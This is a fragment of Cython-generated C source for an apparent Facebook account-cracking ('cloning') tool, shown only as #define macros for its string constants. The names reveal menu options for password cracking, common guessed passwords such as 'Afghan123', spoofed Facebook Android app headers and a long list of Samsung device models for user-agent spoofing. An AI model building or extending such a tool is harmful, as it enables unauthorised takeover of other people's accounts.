#define __pyx_kp_s_1_32m_ZEA_OK_s_s __pyx_mstate_global->__pyx_kp_s_1_32m_ZEA_OK_s_s
#define __pyx_kp_s_1_32m_exp_first123_last123_firs __pyx_mstate_global->__pyx_kp_s_1_32m_exp_first123_last123_firs
#define __pyx_kp_s_1_32mfor_new_ids_use_just_1_pas __pyx_mstate_global->__pyx_kp_s_1_32mfor_new_ids_use_just_1_pas
#define __pyx_kp_s_1_33m_Code_example_0306_0315_03 __pyx_mstate_global->__pyx_kp_s_1_33m_Code_example_0306_0315_03
#define __pyx_kp_s_1_33m_Code_example_077_078_070 __pyx_mstate_global->__pyx_kp_s_1_33m_Code_example_077_078_070
#define __pyx_kp_s_1_33m_ZEA_2F __pyx_mstate_global->__pyx_kp_s_1_33m_ZEA_2F
#define __pyx_kp_s_1_33m_example_2000_3000_5000_10 __pyx_mstate_global->__pyx_kp_s_1_33m_example_2000_3000_5000_10
#define __pyx_kp_s_1_34m_ZEA_2F __pyx_mstate_global->__pyx_kp_s_1_34m_ZEA_2F
#define __pyx_kp_s_1_36m_We_Not_Responsible_if_fac __pyx_mstate_global->__pyx_kp_s_1_36m_We_Not_Responsible_if_fac
#define __pyx_kp_s_1_36m_ZEA_CP __pyx_mstate_global->__pyx_kp_s_1_36m_ZEA_CP
#define __pyx_kp_s_1_37m __pyx_mstate_global->__pyx_kp_s_1_37m
#define __pyx_kp_u_1_37mYour_Key __pyx_mstate_global->__pyx_kp_u_1_37mYour_Key
#define __pyx_kp_s_1_37m_2 __pyx_mstate_global->__pyx_kp_s_1_37m_2
#define __pyx_kp_s_1_37m_38_5_208mUse_flight_mode __pyx_mstate_global->__pyx_kp_s_1_37m_38_5_208mUse_flight_mode
#define __pyx_kp_u_1_37m_Choice_code_1_32m __pyx_mstate_global->__pyx_kp_u_1_37m_Choice_code_1_32m
#define __pyx_kp_u_1_37m_Choice_code_1_32m_2 __pyx_mstate_global->__pyx_kp_u_1_37m_Choice_code_1_32m_2
#define __pyx_kp_s_1_37m_ZEA_R_M1_s_1_37mOK_s_1_37 __pyx_mstate_global->__pyx_kp_s_1_37m_ZEA_R_M1_s_1_37mOK_s_1_37
#define __pyx_kp_s_1_37m_ZEA_XD_M1_s_1_37mOK_s_1_3 __pyx_mstate_global->__pyx_kp_s_1_37m_ZEA_XD_M1_s_1_37mOK_s_1_3
#define __pyx_kp_s_1_37m_ZEA_XD_M2_s_1_37mOK_s_1_3 __pyx_mstate_global->__pyx_kp_s_1_37m_ZEA_XD_M2_s_1_37mOK_s_1_3
#define __pyx_kp_s_1_37m_ZEA_XD_M3_s_1_37mOK_s_1_3 __pyx_mstate_global->__pyx_kp_s_1_37m_ZEA_XD_M3_s_1_37mOK_s_1_3
#define __pyx_kp_s_1_37m_example_khan_ahmad_ali_1 __pyx_mstate_global->__pyx_kp_s_1_37m_example_khan_ahmad_ali_1
#define __pyx_kp_s_1_37m_example_muhammad_ali_sajj __pyx_mstate_global->__pyx_kp_s_1_37m_example_muhammad_ali_sajj
#define __pyx_kp_s_1_37m_install_modules_It_will_t __pyx_mstate_global->__pyx_kp_s_1_37m_install_modules_It_will_t
#define __pyx_kp_s_1_37m_put_code __pyx_mstate_global->__pyx_kp_s_1_37m_put_code
#define __pyx_kp_s_1_93m_Please_Wait_Cloning_start __pyx_mstate_global->__pyx_kp_s_1_93m_Please_Wait_Cloning_start
#define __pyx_kp_s_1_95m_Use_flight_mode_for_speed __pyx_mstate_global->__pyx_kp_s_1_95m_Use_flight_mode_for_speed
#define __pyx_kp_s_1_97m __pyx_mstate_global->__pyx_kp_s_1_97m
#define __pyx_kp_s_1_Afghanistan_cloning_2_Pakista __pyx_mstate_global->__pyx_kp_s_1_Afghanistan_cloning_2_Pakista
#define __pyx_kp_s_1_Crack_with_auto_password_2_Cr __pyx_mstate_global->__pyx_kp_s_1_Crack_with_auto_password_2_Cr
#define __pyx_kp_s_1_File_cloning_2_Random_number __pyx_mstate_global->__pyx_kp_s_1_File_cloning_2_Random_number
#define __pyx_kp_s_1_Method_2_Method_3_Method __pyx_mstate_global->__pyx_kp_s_1_Method_2_Method_3_Method
#define __pyx_kp_s_1_first_last_2_firstlast_3_firs __pyx_mstate_global->__pyx_kp_s_1_first_last_2_firstlast_3_firs
#define __pyx_kp_s_1_first_last_2_firstlast_3_firs_2 __pyx_mstate_global->__pyx_kp_s_1_first_last_2_firstlast_3_firs_2
#define __pyx_kp_s_2 __pyx_mstate_global->__pyx_kp_s_2
#define __pyx_kp_s_210 __pyx_mstate_global->__pyx_kp_s_210
#define __pyx_kp_s_28 __pyx_mstate_global->__pyx_kp_s_28
#define __pyx_kp_s_29 __pyx_mstate_global->__pyx_kp_s_29
#define __pyx_kp_s_3 __pyx_mstate_global->__pyx_kp_s_3
#define __pyx_kp_s_350685531728_62f8ce9f74b12f84c12 __pyx_mstate_global->__pyx_kp_s_350685531728_62f8ce9f74b12f84c12
#define __pyx_kp_s_4 __pyx_mstate_global->__pyx_kp_s_4
#define __pyx_kp_s_5 __pyx_mstate_global->__pyx_kp_s_5
#define __pyx_kp_s_6 __pyx_mstate_global->__pyx_kp_s_6
#define __pyx_kp_s_7 __pyx_mstate_global->__pyx_kp_s_7
#define __pyx_kp_s_786 __pyx_mstate_global->__pyx_kp_s_786
#define __pyx_kp_s_8 __pyx_mstate_global->__pyx_kp_s_8
#define __pyx_kp_s_9 __pyx_mstate_global->__pyx_kp_s_9
#define __pyx_kp_s_980 __pyx_mstate_global->__pyx_kp_s_980
#define __pyx_kp_s_9_0_1 __pyx_mstate_global->__pyx_kp_s_9_0_1
#define __pyx_kp_s_9_FBOP_1_FBCA __pyx_mstate_global->__pyx_kp_s_9_FBOP_1_FBCA
#define __pyx_n_s_A __pyx_mstate_global->__pyx_n_s_A
#define __pyx_kp_s_Accept_Encoding __pyx_mstate_global->__pyx_kp_s_Accept_Encoding
#define __pyx_n_s_Afghan123 __pyx_mstate_global->__pyx_n_s_Afghan123
#define __pyx_n_s_Afghan1234 __pyx_mstate_global->__pyx_n_s_Afghan1234
#define __pyx_n_s_Afghan12345 __pyx_mstate_global->__pyx_n_s_Afghan12345
#define __pyx_n_s_Android __pyx_mstate_global->__pyx_n_s_Android
#define __pyx_kp_s_AppleWebKit_537_36_KHTML_like_Ge __pyx_mstate_global->__pyx_kp_s_AppleWebKit_537_36_KHTML_like_Ge
#define __pyx_kp_s_AppleWebKit_537_36_KHTML_like_Ge_2 __pyx_mstate_global->__pyx_kp_s_AppleWebKit_537_36_KHTML_like_Ge_2
#define __pyx_n_s_Authorization __pyx_mstate_global->__pyx_n_s_Authorization
#define __pyx_n_s_B __pyx_mstate_global->__pyx_n_s_B
#define __pyx_kp_s_Build __pyx_mstate_global->__pyx_kp_s_Build
#define __pyx_n_s_C __pyx_mstate_global->__pyx_n_s_C
#define __pyx_kp_s_Choose __pyx_mstate_global->__pyx_kp_s_Choose
#define __pyx_kp_s_Choose_Option __pyx_mstate_global->__pyx_kp_s_Choose_Option
#define __pyx_kp_s_Choose_an_option __pyx_mstate_global->__pyx_kp_s_Choose_an_option
#define __pyx_n_s_ConnectionError __pyx_mstate_global->__pyx_n_s_ConnectionError
#define __pyx_kp_s_Content_Type __pyx_mstate_global->__pyx_kp_s_Content_Type
#define __pyx_n_s_D __pyx_mstate_global->__pyx_n_s_D
#define __pyx_kp_s_Davik_2_1_0_Linux_U_Android __pyx_mstate_global->__pyx_kp_s_Davik_2_1_0_Linux_U_Android
#define __pyx_kp_s_Do_you_went_show_cp_account_y_n __pyx_mstate_global->__pyx_kp_s_Do_you_went_show_cp_account_y_n
#define __pyx_n_s_Dsj9JMWoixk4Qsje0Ng3nA __pyx_mstate_global->__pyx_n_s_Dsj9JMWoixk4Qsje0Ng3nA
#define __pyx_n_s_E __pyx_mstate_global->__pyx_n_s_E
#define __pyx_kp_s_Enter_your_Name __pyx_mstate_global->__pyx_kp_s_Enter_your_Name
#define __pyx_kp_s_Example_gmail_com_yahoo_com_etc __pyx_mstate_global->__pyx_kp_s_Example_gmail_com_yahoo_com_etc
#define __pyx_kp_s_Expect_an_SMS __pyx_mstate_global->__pyx_kp_s_Expect_an_SMS
#define __pyx_n_s_F __pyx_mstate_global->__pyx_n_s_F
#define __pyx_n_s_FB4A __pyx_mstate_global->__pyx_n_s_FB4A
#define __pyx_kp_s_FBAN __pyx_mstate_global->__pyx_kp_s_FBAN
#define __pyx_kp_s_FBAV __pyx_mstate_global->__pyx_kp_s_FBAV
#define __pyx_kp_s_FBBD __pyx_mstate_global->__pyx_kp_s_FBBD
#define __pyx_kp_s_FBBV __pyx_mstate_global->__pyx_kp_s_FBBV
#define __pyx_kp_s_FBCR __pyx_mstate_global->__pyx_kp_s_FBCR
#define __pyx_kp_s_FBDM __pyx_mstate_global->__pyx_kp_s_FBDM
#define __pyx_kp_s_FBDM_density_2_625_width_1080_h __pyx_mstate_global->__pyx_kp_s_FBDM_density_2_625_width_1080_h
#define __pyx_kp_s_FBDV __pyx_mstate_global->__pyx_kp_s_FBDV
#define __pyx_kp_s_FBMF __pyx_mstate_global->__pyx_kp_s_FBMF
#define __pyx_kp_s_FBOP_19_FBCA __pyx_mstate_global->__pyx_kp_s_FBOP_19_FBCA
#define __pyx_kp_s_FBPN __pyx_mstate_global->__pyx_kp_s_FBPN
#define __pyx_kp_s_FBRV __pyx_mstate_global->__pyx_kp_s_FBRV
#define __pyx_kp_s_FBSV __pyx_mstate_global->__pyx_kp_s_FBSV
#define __pyx_n_s_FileNotFoundError __pyx_mstate_global->__pyx_n_s_FileNotFoundError
#define __pyx_kp_s_File_crack_Create_ids_file_Publ __pyx_mstate_global->__pyx_kp_s_File_crack_Create_ids_file_Publ
#define __pyx_kp_s_File_location_not_found __pyx_mstate_global->__pyx_kp_s_File_location_not_found
#define __pyx_n_s_First __pyx_mstate_global->__pyx_n_s_First
#define __pyx_n_s_G __pyx_mstate_global->__pyx_n_s_G
#define __pyx_kp_s_GT_1015 __pyx_mstate_global->__pyx_kp_s_GT_1015
#define __pyx_kp_s_GT_1020 __pyx_mstate_global->__pyx_kp_s_GT_1020
#define __pyx_kp_s_GT_1030 __pyx_mstate_global->__pyx_kp_s_GT_1030
#define __pyx_kp_s_GT_1035 __pyx_mstate_global->__pyx_kp_s_GT_1035
#define __pyx_kp_s_GT_1040 __pyx_mstate_global->__pyx_kp_s_GT_1040
#define __pyx_kp_s_GT_1045 __pyx_mstate_global->__pyx_kp_s_GT_1045
#define __pyx_kp_s_GT_1050 __pyx_mstate_global->__pyx_kp_s_GT_1050
#define __pyx_kp_s_GT_1240 __pyx_mstate_global->__pyx_kp_s_GT_1240
#define __pyx_kp_s_GT_1440 __pyx_mstate_global->__pyx_kp_s_GT_1440
#define __pyx_kp_s_GT_1450 __pyx_mstate_global->__pyx_kp_s_GT_1450
#define __pyx_kp_s_GT_18190 __pyx_mstate_global->__pyx_kp_s_GT_18190
#define __pyx_kp_s_GT_18262 __pyx_mstate_global->__pyx_kp_s_GT_18262
#define __pyx_kp_s_GT_19060I __pyx_mstate_global->__pyx_kp_s_GT_19060I
#define __pyx_kp_s_GT_19082 __pyx_mstate_global->__pyx_kp_s_GT_19082
#define __pyx_kp_s_GT_19083 __pyx_mstate_global->__pyx_kp_s_GT_19083
#define __pyx_kp_s_GT_19105 __pyx_mstate_global->__pyx_kp_s_GT_19105
#define __pyx_kp_s_GT_19152 __pyx_mstate_global->__pyx_kp_s_GT_19152
#define __pyx_kp_s_GT_19192 __pyx_mstate_global->__pyx_kp_s_GT_19192
#define __pyx_kp_s_GT_19300 __pyx_mstate_global->__pyx_kp_s_GT_19300
#define __pyx_kp_s_GT_19505 __pyx_mstate_global->__pyx_kp_s_GT_19505
#define __pyx_kp_s_GT_2000 __pyx_mstate_global->__pyx_kp_s_GT_2000
#define __pyx_kp_s_GT_20000 __pyx_mstate_global->__pyx_kp_s_GT_20000
#define __pyx_kp_s_GT_200s __pyx_mstate_global->__pyx_kp_s_GT_200s
#define __pyx_kp_s_GT_3000 __pyx_mstate_global->__pyx_kp_s_GT_3000
#define __pyx_kp_s_GT_414XOP __pyx_mstate_global->__pyx_kp_s_GT_414XOP
#define __pyx_kp_s_GT_6918 __pyx_mstate_global->__pyx_kp_s_GT_6918
#define __pyx_kp_s_GT_7010 __pyx_mstate_global->__pyx_kp_s_GT_7010
#define __pyx_kp_s_GT_7020 __pyx_mstate_global->__pyx_kp_s_GT_7020
#define __pyx_kp_s_GT_7030 __pyx_mstate_global->__pyx_kp_s_GT_7030
#define __pyx_kp_s_GT_7040 __pyx_mstate_global->__pyx_kp_s_GT_7040
#define __pyx_kp_s_GT_7050 __pyx_mstate_global->__pyx_kp_s_GT_7050
#define __pyx_kp_s_GT_7100 __pyx_mstate_global->__pyx_kp_s_GT_7100
#define __pyx_kp_s_GT_7105 __pyx_mstate_global->__pyx_kp_s_GT_7105
#define __pyx_kp_s_GT_7110 __pyx_mstate_global->__pyx_kp_s_GT_7110
#define __pyx_kp_s_GT_7205 __pyx_mstate_global->__pyx_kp_s_GT_7205
#define __pyx_kp_s_GT_7210 __pyx_mstate_global->__pyx_kp_s_GT_7210
#define __pyx_kp_s_GT_7240R __pyx_mstate_global->__pyx_kp_s_GT_7240R
#define __pyx_kp_s_GT_7245 __pyx_mstate_global->__pyx_kp_s_GT_7245
#define __pyx_kp_s_GT_7303 __pyx_mstate_global->__pyx_kp_s_GT_7303
#define __pyx_kp_s_GT_7310 __pyx_mstate_global->__pyx_kp_s_GT_7310
#define __pyx_kp_s_GT_7320 __pyx_mstate_global->__pyx_kp_s_GT_7320
#define __pyx_kp_s_GT_7325 __pyx_mstate_global->__pyx_kp_s_GT_7325
#define __pyx_kp_s_GT_7326 __pyx_mstate_global->__pyx_kp_s_GT_7326
#define __pyx_kp_s_GT_7340 __pyx_mstate_global->__pyx_kp_s_GT_7340
#define __pyx_kp_s_GT_7405 __pyx_mstate_global->__pyx_kp_s_GT_7405
#define __pyx_kp_s_GT_7550_5GT_8005 __pyx_mstate_global->__pyx_kp_s_GT_7550_5GT_8005
#define __pyx_kp_s_GT_8010 __pyx_mstate_global->__pyx_kp_s_GT_8010
#define __pyx_kp_s_GT_81 __pyx_mstate_global->__pyx_kp_s_GT_81
#define __pyx_kp_s_GT_810 __pyx_mstate_global->__pyx_kp_s_GT_810
#define __pyx_kp_s_GT_8105 __pyx_mstate_global->__pyx_kp_s_GT_8105
#define __pyx_kp_s_GT_8110 __pyx_mstate_global->__pyx_kp_s_GT_8110
#define __pyx_kp_s_GT_8220S __pyx_mstate_global->__pyx_kp_s_GT_8220S
#define __pyx_kp_s_GT_8410 __pyx_mstate_global->__pyx_kp_s_GT_8410
#define __pyx_kp_s_GT_9300 __pyx_mstate_global->__pyx_kp_s_GT_9300
#define __pyx_kp_s_GT_9320 __pyx_mstate_global->__pyx_kp_s_GT_9320
#define __pyx_kp_s_GT_93G __pyx_mstate_global->__pyx_kp_s_GT_93G
#define __pyx_kp_s_GT_A7100 __pyx_mstate_global->__pyx_kp_s_GT_A7100
#define __pyx_kp_s_GT_A9500 __pyx_mstate_global->__pyx_kp_s_GT_A9500
#define __pyx_kp_s_GT_ANDROID __pyx_mstate_global->__pyx_kp_s_GT_ANDROID
#define __pyx_kp_s_GT_B2710 __pyx_mstate_global->__pyx_kp_s_GT_B2710
#define __pyx_kp_s_GT_B5330 __pyx_mstate_global->__pyx_kp_s_GT_B5330
#define __pyx_kp_s_GT_B5330B __pyx_mstate_global->__pyx_kp_s_GT_B5330B
#define __pyx_kp_s_GT_B5330L __pyx_mstate_global->__pyx_kp_s_GT_B5330L
#define __pyx_kp_s_GT_B5330ZKAINU __pyx_mstate_global->__pyx_kp_s_GT_B5330ZKAINU
#define __pyx_kp_s_GT_B5510 __pyx_mstate_global->__pyx_kp_s_GT_B5510
#define __pyx_kp_s_GT_B5512 __pyx_mstate_global->__pyx_kp_s_GT_B5512
#define __pyx_kp_s_GT_B5722 __pyx_mstate_global->__pyx_kp_s_GT_B5722
#define __pyx_kp_s_GT_B7510 __pyx_mstate_global->__pyx_kp_s_GT_B7510
#define __pyx_kp_s_GT_B7722 __pyx_mstate_global->__pyx_kp_s_GT_B7722
#define __pyx_kp_s_GT_B7810 __pyx_mstate_global->__pyx_kp_s_GT_B7810
#define __pyx_kp_s_GT_B9150 __pyx_mstate_global->__pyx_kp_s_GT_B9150
#define __pyx_kp_s_GT_B9388 __pyx_mstate_global->__pyx_kp_s_GT_B9388
#define __pyx_kp_s_GT_C3010 __pyx_mstate_global->__pyx_kp_s_GT_C3010
#define __pyx_kp_s_GT_C3262 __pyx_mstate_global->__pyx_kp_s_GT_C3262
#define __pyx_kp_s_GT_C3310R __pyx_mstate_global->__pyx_kp_s_GT_C3310R
#define __pyx_kp_s_GT_C3312 __pyx_mstate_global->__pyx_kp_s_GT_C3312
#define __pyx_kp_s_GT_C3312R __pyx_mstate_global->__pyx_kp_s_GT_C3312R
#define __pyx_kp_s_GT_C3313T __pyx_mstate_global->__pyx_kp_s_GT_C3313T
#define __pyx_kp_s_GT_C3322 __pyx_mstate_global->__pyx_kp_s_GT_C3322
#define __pyx_kp_s_GT_C3322i __pyx_mstate_global->__pyx_kp_s_GT_C3322i
#define __pyx_kp_s_GT_C3520 __pyx_mstate_global->__pyx_kp_s_GT_C3520
#define __pyx_kp_s_GT_C3520I __pyx_mstate_global->__pyx_kp_s_GT_C3520I
#define __pyx_kp_s_GT_C3592 __pyx_mstate_global->__pyx_kp_s_GT_C3592
#define __pyx_kp_s_GT_C3595 __pyx_mstate_global->__pyx_kp_s_GT_C3595
#define __pyx_kp_s_GT_C3782 __pyx_mstate_global->__pyx_kp_s_GT_C3782
#define __pyx_kp_s_GT_C6712 __pyx_mstate_global->__pyx_kp_s_GT_C6712
#define __pyx_kp_s_GT_E1282T __pyx_mstate_global->__pyx_kp_s_GT_E1282T
#define __pyx_kp_s_GT_E1500 __pyx_mstate_global->__pyx_kp_s_GT_E1500
#define __pyx_kp_s_GT_E2200 __pyx_mstate_global->__pyx_kp_s_GT_E2200
#define __pyx_kp_s_GT_E2202 __pyx_mstate_global->__pyx_kp_s_GT_E2202
#define __pyx_kp_s_GT_E2250 __pyx_mstate_global->__pyx_kp_s_GT_E2250
#define __pyx_kp_s_GT_E2252 __pyx_mstate_global->__pyx_kp_s_GT_E2252
#define __pyx_kp_s_GT_E2600 __pyx_mstate_global->__pyx_kp_s_GT_E2600
#define __pyx_kp_s_GT_E2652W __pyx_mstate_global->__pyx_kp_s_GT_E2652W
#define __pyx_kp_s_GT_E3210 __pyx_mstate_global->__pyx_kp_s_GT_E3210
#define __pyx_kp_s_GT_E3309 __pyx_mstate_global->__pyx_kp_s_GT_E3309
#define __pyx_kp_s_GT_E3309I __pyx_mstate_global->__pyx_kp_s_GT_E3309I
#define __pyx_kp_s_GT_E3309T __pyx_mstate_global->__pyx_kp_s_GT_E3309T
#define __pyx_kp_s_GT_G530H __pyx_mstate_global->__pyx_kp_s_GT_G530H
#define __pyx_kp_s_GT_G930F __pyx_mstate_global->__pyx_kp_s_GT_G930F
#define __pyx_kp_s_GT_H9500 __pyx_mstate_global->__pyx_kp_s_GT_H9500
#define __pyx_kp_s_GT_I5508 __pyx_mstate_global->__pyx_kp_s_GT_I5508
#define __pyx_kp_s_GT_I5801 __pyx_mstate_global->__pyx_kp_s_GT_I5801
#define __pyx_kp_s_GT_I6410 __pyx_mstate_global->__pyx_kp_s_GT_I6410
#define __pyx_kp_s_GT_I8150 __pyx_mstate_global->__pyx_kp_s_GT_I8150
#define __pyx_kp_s_GT_I8160OKLTPA __pyx_mstate_global->__pyx_kp_s_GT_I8160OKLTPA
#define __pyx_kp_s_GT_I8160ZWLTTT __pyx_mstate_global->__pyx_kp_s_GT_I8160ZWLTTT
#define __pyx_kp_s_GT_I8258 __pyx_mstate_global->__pyx_kp_s_GT_I8258
#define __pyx_kp_s_GT_I8262D __pyx_mstate_global->__pyx_kp_s_GT_I8262D
#define __pyx_kp_s_GT_I8268 __pyx_mstate_global->__pyx_kp_s_GT_I8268
#define __pyx_kp_s_GT_I8505 __pyx_mstate_global->__pyx_kp_s_GT_I8505
#define __pyx_kp_s_GT_I8530BAABTU __pyx_mstate_global->__pyx_kp_s_GT_I8530BAABTU
#define __pyx_kp_s_GT_I8530BALCHO __pyx_mstate_global->__pyx_kp_s_GT_I8530BALCHO
#define __pyx_kp_s_GT_I8530BALTTT __pyx_mstate_global->__pyx_kp_s_GT_I8530BALTTT
#define __pyx_kp_s_GT_I8550E __pyx_mstate_global->__pyx_kp_s_GT_I8550E
#define __pyx_kp_s_GT_I8750 __pyx_mstate_global->__pyx_kp_s_GT_I8750
#define __pyx_kp_s_GT_I900 __pyx_mstate_global->__pyx_kp_s_GT_I900
#define __pyx_kp_s_GT_I9008L __pyx_mstate_global->__pyx_kp_s_GT_I9008L
#define __pyx_kp_s_GT_I9080E __pyx_mstate_global->__pyx_kp_s_GT_I9080E
#define __pyx_kp_s_GT_I9082C __pyx_mstate_global->__pyx_kp_s_GT_I9082C
#define __pyx_kp_s_GT_I9082EWAINU __pyx_mstate_global->__pyx_kp_s_GT_I9082EWAINU
#define __pyx_kp_s_GT_I9082i __pyx_mstate_global->__pyx_kp_s_GT_I9082i
#define __pyx_kp_s_GT_I9100G __pyx_mstate_global->__pyx_kp_s_GT_I9100G
#define __pyx_kp_s_GT_I9100LKLCHT __pyx_mstate_global->__pyx_kp_s_GT_I9100LKLCHT
#define __pyx_kp_s_GT_I9100M __pyx_mstate_global->__pyx_kp_s_GT_I9100M
#define __pyx_kp_s_GT_I9100P __pyx_mstate_global->__pyx_kp_s_GT_I9100P
#define __pyx_kp_s_GT_I9100T __pyx_mstate_global->__pyx_kp_s_GT_I9100T
#define __pyx_kp_s_GT_I9105UANDBT __pyx_mstate_global->__pyx_kp_s_GT_I9105UANDBT
#define __pyx_kp_s_GT_I9128E __pyx_mstate_global->__pyx_kp_s_GT_I9128E
#define __pyx_kp_s_GT_I9128I __pyx_mstate_global->__pyx_kp_s_GT_I9128I
#define __pyx_kp_s_GT_I9128V __pyx_mstate_global->__pyx_kp_s_GT_I9128V
#define __pyx_kp_s_GT_I9158P __pyx_mstate_global->__pyx_kp_s_GT_I9158P
#define __pyx_kp_s_GT_I9158V __pyx_mstate_global->__pyx_kp_s_GT_I9158V
#define __pyx_kp_s_GT_I9168I __pyx_mstate_global->__pyx_kp_s_GT_I9168I
#define __pyx_kp_s_GT_I9190_KOT49H __pyx_mstate_global->__pyx_kp_s_GT_I9190_KOT49H
#define __pyx_kp_s_GT_I9192I __pyx_mstate_global->__pyx_kp_s_GT_I9192I
#define __pyx_kp_s_GT_I9192_KOT49H __pyx_mstate_global->__pyx_kp_s_GT_I9192_KOT49H
#define __pyx_kp_s_GT_I9195H __pyx_mstate_global->__pyx_kp_s_GT_I9195H
#define __pyx_kp_s_GT_I9195L __pyx_mstate_global->__pyx_kp_s_GT_I9195L
#define __pyx_kp_s_GT_I9250 __pyx_mstate_global->__pyx_kp_s_GT_I9250
#define __pyx_kp_s_GT_I9300I_KTU84P __pyx_mstate_global->__pyx_kp_s_GT_I9300I_KTU84P
#define __pyx_kp_s_GT_I9300_IMM76D __pyx_mstate_global->__pyx_kp_s_GT_I9300_IMM76D
#define __pyx_kp_s_GT_I9300_JSS15J __pyx_mstate_global->__pyx_kp_s_GT_I9300_JSS15J
#define __pyx_kp_s_GT_I9301I_KOT4 __pyx_mstate_global->__pyx_kp_s_GT_I9301I_KOT4
#define __pyx_kp_s_GT_I9301I_KOT49H __pyx_mstate_global->__pyx_kp_s_GT_I9301I_KOT49H
#define __pyx_kp_s_GT_I9303I __pyx_mstate_global->__pyx_kp_s_GT_I9303I
#define __pyx_kp_s_GT_I9305N __pyx_mstate_global->__pyx_kp_s_GT_I9305N
#define __pyx_kp_s_GT_I9308I __pyx_mstate_global->__pyx_kp_s_GT_I9308I
#define __pyx_kp_s_GT_I9500_JDQ39 __pyx_mstate_global->__pyx_kp_s_GT_I9500_JDQ39
#define __pyx_kp_s_GT_I9500_LRX22C __pyx_mstate_global->__pyx_kp_s_GT_I9500_LRX22C
#define __pyx_kp_s_GT_I9505G __pyx_mstate_global->__pyx_kp_s_GT_I9505G
#define __pyx_kp_s_GT_I9505X __pyx_mstate_global->__pyx_kp_s_GT_I9505X
#define __pyx_kp_s_GT_I9507V __pyx_mstate_global->__pyx_kp_s_GT_I9507V
#define __pyx_kp_s_GT_I9600 __pyx_mstate_global->__pyx_kp_s_GT_I9600
#define __pyx_kp_s_GT_M5650 __pyx_mstate_global->__pyx_kp_s_GT_M5650
#define __pyx_kp_s_GT_N5000S __pyx_mstate_global->__pyx_kp_s_GT_N5000S
#define __pyx_kp_s_GT_N5100 __pyx_mstate_global->__pyx_kp_s_GT_N5100
#define __pyx_kp_s_GT_N5100_JZO54K __pyx_mstate_global->__pyx_kp_s_GT_N5100_JZO54K
#define __pyx_kp_s_GT_N5105 __pyx_mstate_global->__pyx_kp_s_GT_N5105
#define __pyx_kp_s_GT_N5110 __pyx_mstate_global->__pyx_kp_s_GT_N5110
#define __pyx_kp_s_GT_N5120 __pyx_mstate_global->__pyx_kp_s_GT_N5120
#define __pyx_kp_s_GT_N7000B __pyx_mstate_global->__pyx_kp_s_GT_N7000B
#define __pyx_kp_s_GT_N7005 __pyx_mstate_global->__pyx_kp_s_GT_N7005
#define __pyx_kp_s_GT_N7100T __pyx_mstate_global->__pyx_kp_s_GT_N7100T
#define __pyx_kp_s_GT_N7100_KOT49H __pyx_mstate_global->__pyx_kp_s_GT_N7100_KOT49H
#define __pyx_kp_s_GT_N7102 __pyx_mstate_global->__pyx_kp_s_GT_N7102
#define __pyx_kp_s_GT_N7105 __pyx_mstate_global->__pyx_kp_s_GT_N7105
#define __pyx_kp_s_GT_N7105T __pyx_mstate_global->__pyx_kp_s_GT_N7105T
#define __pyx_kp_s_GT_N7108 __pyx_mstate_global->__pyx_kp_s_GT_N7108
#define __pyx_kp_s_GT_N7108D __pyx_mstate_global->__pyx_kp_s_GT_N7108D
#define __pyx_kp_s_GT_N8000 __pyx_mstate_global->__pyx_kp_s_GT_N8000
#define __pyx_kp_s_GT_N8000_JZO54K __pyx_mstate_global->__pyx_kp_s_GT_N8000_JZO54K
#define __pyx_kp_s_GT_N8000_KOT49H __pyx_mstate_global->__pyx_kp_s_GT_N8000_KOT49H
#define __pyx_kp_s_GT_N8005 __pyx_mstate_global->__pyx_kp_s_GT_N8005
#define __pyx_kp_s_GT_N8010 __pyx_mstate_global->__pyx_kp_s_GT_N8010
#define __pyx_kp_s_GT_N8020 __pyx_mstate_global->__pyx_kp_s_GT_N8020
#define __pyx_kp_s_GT_N9000 __pyx_mstate_global->__pyx_kp_s_GT_N9000
#define __pyx_kp_s_GT_N9505 __pyx_mstate_global->__pyx_kp_s_GT_N9505
#define __pyx_kp_s_GT_P1000CWAXSA __pyx_mstate_global->__pyx_kp_s_GT_P1000CWAXSA
#define __pyx_kp_s_GT_P1000M __pyx_mstate_global->__pyx_kp_s_GT_P1000M
#define __pyx_kp_s_GT_P1000T __pyx_mstate_global->__pyx_kp_s_GT_P1000T
#define __pyx_kp_s_GT_P1010 __pyx_mstate_global->__pyx_kp_s_GT_P1010
#define __pyx_kp_s_GT_P3100B __pyx_mstate_global->__pyx_kp_s_GT_P3100B
#define __pyx_kp_s_GT_P3105 __pyx_mstate_global->__pyx_kp_s_GT_P3105
#define __pyx_kp_s_GT_P3108 __pyx_mstate_global->__pyx_kp_s_GT_P3108
#define __pyx_kp_s_GT_P3110 __pyx_mstate_global->__pyx_kp_s_GT_P3110
#define __pyx_kp_s_GT_P3110_JZO54K __pyx_mstate_global->__pyx_kp_s_GT_P3110_JZO54K
#define __pyx_kp_s_GT_P5100 __pyx_mstate_global->__pyx_kp_s_GT_P5100
#define __pyx_kp_s_GT_P5100_IML74K __pyx_mstate_global->__pyx_kp_s_GT_P5100_IML74K
#define __pyx_kp_s_GT_P5100_JDQ __pyx_mstate_global->__pyx_kp_s_GT_P5100_JDQ
#define __pyx_kp_s_GT_P5100_JDQ39 __pyx_mstate_global->__pyx_kp_s_GT_P5100_JDQ39
#define __pyx_kp_s_GT_P5100_JZO54K __pyx_mstate_global->__pyx_kp_s_GT_P5100_JZO54K
#define __pyx_kp_s_GT_P5110_JDQ39 __pyx_mstate_global->__pyx_kp_s_GT_P5110_JDQ39
#define __pyx_kp_s_GT_P5200 __pyx_mstate_global->__pyx_kp_s_GT_P5200
#define __pyx_kp_s_GT_P5200_KOT49H __pyx_mstate_global->__pyx_kp_s_GT_P5200_KOT49H
#define __pyx_kp_s_GT_P5210XD1 __pyx_mstate_global->__pyx_kp_s_GT_P5210XD1
#define __pyx_kp_s_GT_P5210_KOT49H __pyx_mstate_global->__pyx_kp_s_GT_P5210_KOT49H
#define __pyx_kp_s_GT_P5220 __pyx_mstate_global->__pyx_kp_s_GT_P5220
#define __pyx_kp_s_GT_P5220_JDQ39 __pyx_mstate_global->__pyx_kp_s_GT_P5220_JDQ39
#define __pyx_kp_s_GT_P6200 __pyx_mstate_global->__pyx_kp_s_GT_P6200
#define __pyx_kp_s_GT_P6200L __pyx_mstate_global->__pyx_kp_s_GT_P6200L
#define __pyx_kp_s_GT_P6201 __pyx_mstate_global->__pyx_kp_s_GT_P6201
#define __pyx_kp_s_GT_P6210 __pyx_mstate_global->__pyx_kp_s_GT_P6210
#define __pyx_kp_s_GT_P6211 __pyx_mstate_global->__pyx_kp_s_GT_P6211
#define __pyx_kp_s_GT_P6800 __pyx_mstate_global->__pyx_kp_s_GT_P6800
#define __pyx_kp_s_GT_P7100 __pyx_mstate_global->__pyx_kp_s_GT_P7100
